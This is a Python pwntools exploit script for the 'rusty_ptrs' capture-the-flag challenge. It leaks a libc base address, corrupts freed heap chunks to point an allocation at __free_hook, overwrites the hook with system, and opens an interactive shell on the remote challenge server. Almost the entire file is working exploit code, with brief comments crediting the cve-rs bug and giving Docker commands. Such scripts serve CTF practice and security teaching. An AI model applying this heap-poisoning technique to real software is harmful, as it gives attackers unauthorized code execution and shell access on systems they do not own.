#!/usr/bin/env python3

from pwn import *

exe = ELF("./rusty_ptrs_patched")
libc = ELF("./libc-2.31.so", checksec = False)
ld = ELF("./ld-2.31.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("rusty-pointers.chal.uiuc.tf", 1337, ssl = True)

    return r


def make_rule():
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"1")


def make_note():
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"2")


def make_law():
    r.sendlineafter(b"> ", b"5")
    return int(r.recvline().decode().split(', ')[0], 16)


def delete_rule(index: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(index).encode())


def delete_note(index: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(index).encode())


def read_rule(index: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(index).encode())

    r.recvline() # "Contents of Buffer"
    r.recvline() # "Buffer"
    
    ints = r.recvline().decode().split(', ')
    return (int(ints[0], 16), int(ints[1],16))


def read_note(index: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(index).encode())

    r.recvline() # "Contents of Buffer"
    r.recvline() # "Buffer"
    
    return r.recvline()


def edit_rule(index: int, data: bytes):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(index).encode())
    r.sendlineafter(b"> ", data)


def edit_note(index: int, data: bytes):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(index).encode())
    r.sendlineafter(b"> ", data)


# Vuln inj used in the chall  -->  https://github.com/Speykious/cve-rs
# Build Docker container      -->  sudo docker build -t chall .
# Run Docker container        -->  sudo docker run --rm -p 1337:1337 chall
# NOTE: We should patch the binary with all the given libc but i don't know how to do it :)
def main():
    r = conn()

    # Get free leaks:
    leak = make_law()
    libc.address = leak - 0x3b20      # leak - 0x1ecbe0
    log.info(f"LIBC Base: 0x{libc.address:x}")

    # Underneath uses fastbins
    make_note()
    make_note()
    delete_note(0)
    delete_note(0)
    make_rule()

    free_hook = libc.symbols["__free_hook"]
    log.info(f"free()`s hook: 0x{free_hook:x}")

    edit_rule(0, p64(free_hook))
    make_note()
    make_note()

    system = libc.symbols['system']
    edit_note(0, b'/bin/sh')
    edit_note(1, p64(system))

    r.interactive("$ ")


if __name__ == "__main__":
    main()
